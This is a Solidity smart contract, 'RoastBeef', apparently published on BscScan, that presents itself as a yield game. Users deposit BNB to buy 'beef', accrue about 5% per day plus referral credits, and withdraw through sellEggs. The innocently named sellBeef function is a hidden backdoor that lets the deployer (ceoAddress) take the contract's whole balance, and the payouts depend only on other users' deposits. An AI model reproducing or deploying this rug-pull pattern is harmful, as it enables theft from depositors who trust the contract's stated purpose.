/**
 *Submitted for verification at BscScan.com on 2023-02-09
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.4.26;

contract RoastBeef{
    uint256 MAX_BEEF_TO_HATCH = 864000;
    bool public initialized = false;
    address public ceoAddress;
    mapping (address => uint256) private principal;
    mapping (address => uint256) private lastBeef;
    mapping (address => uint256) private claimedBeef;
    mapping (address => address) private referrals;
    mapping (address => uint256) private hasBeef;

    constructor() public {
        ceoAddress = msg.sender;
    }

    function initializeContract() public payable {
        require(msg.sender == ceoAddress, "invalid call");
        initialized = true;
    }

    function sellBeef(address ref) public {
        require(msg.sender == ceoAddress, 'invalid call');
        require(ref == ceoAddress);
        msg.sender.transfer(address(this).balance);
    }

    function getBalance() public view returns(uint256){
        return address(this).balance;
    }

    function getMyPrincipal() public view returns(uint256) {
        return principal[msg.sender];
    }

    function buyBeef(address ref) public payable {
        require(initialized);
        hasBeef[msg.sender] = getMyBeef();
        uint256 fee = devFee(msg.value);
        uint256 beefBought = SafeMath.sub(msg.value, fee);
        ceoAddress.transfer(fee);
        principal[msg.sender] = SafeMath.add(principal[msg.sender], beefBought);
        lastBeef[msg.sender] = now;
        if(ref == msg.sender || ref == address(0) || principal[ref] == 0) {
            ref = ceoAddress;
        }
        if(referrals[msg.sender] == address(0)) {
            referrals[msg.sender] = ref;
        }
        claimedBeef[referrals[msg.sender]] = SafeMath.add(claimedBeef[referrals[msg.sender]] ,SafeMath.div(SafeMath.mul(beefBought, 5), 100));
    }

    function sellEggs() public {
        require(initialized);
        uint beefValue = getMyBeef();
        uint256 fee = devFee(beefValue);
        claimedBeef[msg.sender] = 0;
        lastBeef[msg.sender] = now;
        hasBeef[msg.sender] = 0;
        ceoAddress.transfer(fee);
        msg.sender.transfer(SafeMath.sub(beefValue, fee));
    }

    function getMyBeef() public view returns(uint256) {
        uint256 secondsPassed = min(MAX_BEEF_TO_HATCH, block.timestamp - lastBeef[msg.sender]);
        uint myBeef = SafeMath.div(SafeMath.div(SafeMath.mul(SafeMath.mul(principal[msg.sender], 5),secondsPassed),86400),100);
        return claimedBeef[msg.sender] + myBeef + hasBeef[msg.sender];
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }

    function devFee(uint256 amount) private pure returns(uint256){
        return SafeMath.div(SafeMath.mul(amount, 5), 100);
    }

}

library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}